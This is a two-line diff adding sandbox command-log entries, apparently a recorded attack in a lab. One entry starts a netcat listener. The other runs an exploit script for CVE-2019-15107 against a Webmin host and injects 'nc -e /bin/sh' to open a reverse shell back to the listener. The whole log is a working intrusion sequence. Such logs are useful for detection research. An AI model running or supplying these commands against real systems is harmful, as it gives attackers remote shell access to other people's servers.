@@ -1,0 +1,2 @@
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:40:41.564146+02:00", "cmd_type": "bash-command", "cmd": "nc -l 8080"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:41:45.972575+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080'"}
